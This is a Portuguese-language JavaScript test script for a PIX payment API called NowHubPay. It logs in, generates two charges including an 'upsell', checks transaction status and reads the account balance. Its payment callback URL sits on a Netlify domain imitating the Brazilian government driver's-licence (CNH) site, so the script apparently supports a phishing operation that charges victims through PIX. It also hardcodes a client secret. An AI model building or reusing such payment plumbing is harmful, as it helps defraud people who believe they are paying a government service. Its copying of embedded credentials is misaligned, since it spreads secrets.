/**
 * Teste completo da migração para NowHubPay
 * Testa autenticação, geração de PIX e consulta de status
 */

const NOWHUB_BASE = "https://api.nowhubpay.com";
const NOWHUB_CLIENT_ID = "cli_15abcbafb56a6521";
const NOWHUB_CLIENT_SECRET = "sec_4e9f4d28a87db26ef504b5d5bf563ce53a4ea44dfd27be42";

let authToken = null;

// Step 1: Autenticação
async function testAuth() {
  console.log("\n🔐 TESTE 1: Autenticação");
  console.log("=" .repeat(70));

  try {
    const response = await fetch(`${NOWHUB_BASE}/v1/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        client_id: NOWHUB_CLIENT_ID,
        client_secret: NOWHUB_CLIENT_SECRET
      })
    });

    const data = await response.json();

    if (response.ok && data.access_token) {
      console.log("✅ Autenticação com sucesso!");
      console.log(`   Token: ${data.access_token.substring(0, 30)}...`);
      console.log(`   Expires in: ${data.expires_in}s`);
      authToken = data.access_token;
      return true;
    } else {
      console.log("❌ Erro na autenticação!");
      console.log(`   Status: ${response.status}`);
      console.log(`   Erro: ${data.detail || data.title || JSON.stringify(data)}`);
      return false;
    }
  } catch (err) {
    console.log(`❌ Erro: ${err.message}`);
    return false;
  }
}

// Step 2: Gerar PIX
async function testPixGeneration(amount, description) {
  console.log(`\n💳 TESTE 2: Gerar PIX (R$ ${amount})`);
  console.log("=" .repeat(70));

  if (!authToken) {
    console.log("❌ Token não disponível! Execute o teste de autenticação primeiro.");
    return null;
  }

  const randId = Math.random().toString(36).slice(2, 10);
  const cpf = "12345678901";

  const payload = {
    amount: amount,
    external_id: `order_${randId}`,
    payer: {
      name: "Teste NowHub",
      document: cpf
    },
    clientCallbackUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment"
  };

  console.log(`   Payload: ${JSON.stringify(payload, null, 2)}`);

  try {
    const response = await fetch(`${NOWHUB_BASE}/v1/payments/deposit`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${authToken}`
      },
      body: JSON.stringify(payload)
    });

    const text = await response.text();
    let data = {};
    
    try {
      data = JSON.parse(text);
    } catch (e) {
      console.log("❌ Erro ao fazer parse!");
      console.log(`   Resposta: ${text.substring(0, 200)}`);
      return null;
    }

    if (response.ok && data.transaction_id && data.pix_copy_paste) {
      console.log("✅ PIX GERADO COM SUCESSO!");
      console.log(`   Transaction ID: ${data.transaction_id}`);
      console.log(`   Amount: R$ ${data.amount}`);
      console.log(`   Status: ${data.status}`);
      console.log(`   ✓ PIX Copy Paste: Sim`);
      
      return data.transaction_id;
    } else {
      console.log("❌ Erro ao gerar PIX!");
      console.log(`   Status: ${response.status}`);
      console.log(`   Erro: ${data.detail || data.title || JSON.stringify(data)}`);
      return null;
    }
  } catch (err) {
    console.log(`❌ Erro: ${err.message}`);
    return null;
  }
}

// Step 3: Consultar status
async function testCheckPayment(transactionId) {
  console.log(`\n🔍 TESTE 3: Consultar Status (${transactionId})`);
  console.log("=" .repeat(70));

  if (!authToken) {
    console.log("❌ Token não disponível!");
    return false;
  }

  try {
    const response = await fetch(
      `${NOWHUB_BASE}/v1/transactions/${encodeURIComponent(transactionId)}`,
      {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${authToken}`
        }
      }
    );

    const text = await response.text();
    let data = {};
    
    try {
      data = JSON.parse(text);
    } catch (e) {
      console.log("❌ Erro ao fazer parse!");
      return false;
    }

    if (response.ok) {
      console.log("✅ Status consultado com sucesso!");
      console.log(`   Transaction ID: ${data.transaction_id}`);
      console.log(`   Status: ${data.status}`);
      console.log(`   Amount: R$ ${data.amount}`);
      console.log(`   Type: ${data.type}`);
      return true;
    } else {
      console.log("❌ Erro ao consultar status!");
      console.log(`   Status HTTP: ${response.status}`);
      console.log(`   Erro: ${data.detail || data.title || JSON.stringify(data)}`);
      return false;
    }
  } catch (err) {
    console.log(`❌ Erro: ${err.message}`);
    return false;
  }
}

// Step 4: Consultar saldo
async function testBalance() {
  console.log(`\n💰 TESTE 4: Consultar Saldo`);
  console.log("=" .repeat(70));

  if (!authToken) {
    console.log("❌ Token não disponível!");
    return false;
  }

  try {
    const response = await fetch(
      `${NOWHUB_BASE}/v1/balance`,
      {
        method: "GET",
        headers: {
          "Authorization": `Bearer ${authToken}`
        }
      }
    );

    const text = await response.text();
    let data = {};
    
    try {
      data = JSON.parse(text);
    } catch (e) {
      console.log("❌ Erro ao fazer parse!");
      return false;
    }

    if (response.ok) {
      console.log("✅ Saldo consultado com sucesso!");
      console.log(`   Disponível: R$ ${data.available}`);
      console.log(`   Retido: R$ ${data.held}`);
      console.log(`   Total: R$ ${data.total}`);
      console.log(`   PIX Pagos: R$ ${data.pix_paid_value}`);
      console.log(`   PIX Gerados: ${data.pix_generated_count}`);
      return true;
    } else {
      console.log("❌ Erro ao consultar saldo!");
      console.log(`   Status HTTP: ${response.status}`);
      console.log(`   Erro: ${data.detail || data.title || JSON.stringify(data)}`);
      return false;
    }
  } catch (err) {
    console.log(`❌ Erro: ${err.message}`);
    return false;
  }
}

// Executar todos os testes
async function runAllTests() {
  console.log("\n🚀 TESTE COMPLETO - NOWHUBPAY");
  console.log("=" .repeat(70));

  // Test 1: Auth
  const authOk = await testAuth();
  if (!authOk) {
    console.log("\n❌ Falha na autenticação. Interrompendo testes.");
    return;
  }

  // Test 2: Generate PIX
  const txId1 = await testPixGeneration(65.70, "SHOPIFY LOJA 03");
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  const txId2 = await testPixGeneration(79.40, "SHOPIFY LOJA 03 - Upsell");
  await new Promise(resolve => setTimeout(resolve, 2000));

  // Test 3: Check Payment
  if (txId1) {
    await testCheckPayment(txId1);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  // Test 4: Balance
  await testBalance();

  // Summary
  console.log("\n" + "=" .repeat(70));
  console.log("📊 RESUMO");
  console.log("=" .repeat(70));
  
  if (authOk && txId1 && txId2) {
    console.log("✅ TODOS OS TESTES PASSARAM!");
    console.log("   Autenticação: ✓");
    console.log("   PIX 65.70: ✓");
    console.log("   PIX 79.40: ✓");
    console.log("\n✅ Pronto para fazer commit e push!");
  } else {
    console.log("❌ Alguns testes falharam. Verifique acima.");
  }
}

runAllTests();
